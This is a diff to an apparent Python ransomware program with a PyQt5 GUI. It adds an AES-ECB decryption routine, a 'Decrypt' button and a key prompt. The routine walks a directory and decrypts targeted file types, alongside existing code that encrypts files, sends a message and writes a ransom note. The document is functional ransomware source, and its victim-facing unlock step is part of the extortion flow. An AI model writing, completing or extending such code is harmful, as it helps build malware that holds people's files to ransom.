@@ -117,6 +117,20 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         except Exception as e:
             print(f"Error encrypting {file}: {e}")
 
+    def decryptFile(self, file, decryption_key):
+        try:
+            with open(file, 'rb') as infile:
+                ciphertext = infile.read()
+                key = decryption_key.encode()  # Convert decryption key to bytes
+                cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).decryptor()
+                plaintext = cipher.update(ciphertext) + cipher.finalize()
+                unpadder = padding.PKCS7(128).unpadder()
+                decrypted_data = unpadder.update(plaintext) + unpadder.finalize()
+                with open(file, "wb") as outfile:
+                    outfile.write(decrypted_data)
+        except Exception as e:
+            print(f"Error decrypting {file}: {e}")
+
     # Main method for ransomware functionality
 
     '''def run(self):
@@ -253,6 +267,44 @@ class RansomwareGUI(QMainWindow):
         ransomware_instance = Ransomware()
         ransomware_instance.sendMessage()
         ransomware_instance.readMe()
+
+            # Add decryption button
+        decrypt_button = QPushButton('Decrypt', self)
+        decrypt_button.setStyleSheet("""
+            QPushButton{
+                background-color: #d50000;
+                border-radius: 7.5px;
+                font-weight: 1200;
+                font-size: 18px;
+                color: #000;  /* Black font color */
+            }
+            QPushButton:hover {
+                background-color: #9b0000;
+            }
+        """)
+        self.layout.addWidget(decrypt_button)
+        decrypt_button.clicked.connect(self.decryptFiles)
+        
+        # Add decryption progress bars
+        self.decryption_progress_bars = [QProgressBar(self) for _ in range(3)]
+        for progress_bar in self.decryption_progress_bars:
+            self.layout.addWidget(progress_bar)
+            self.setStyleSheet("""
+                QProgressBar{
+                    color: #fff;                                
+                }
+            """)
+
+    def decryptFiles(self):
+        decryption_key, ok = PyQt5.QtWidgets.QInputDialog.getText(self, 'Decryption Key', 'Enter decryption key:')
+        if ok:
+            ransomware_instance = Ransomware()
+            for root, directories, files in os.walk(ransomware_instance.filePath):
+                for filename in files:
+                    filepath = os.path.join(root, filename)
+                    for base in fileTypes:
+                        if base in filepath:
+                            threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
         
     def initUI(self):
         # Create central widget
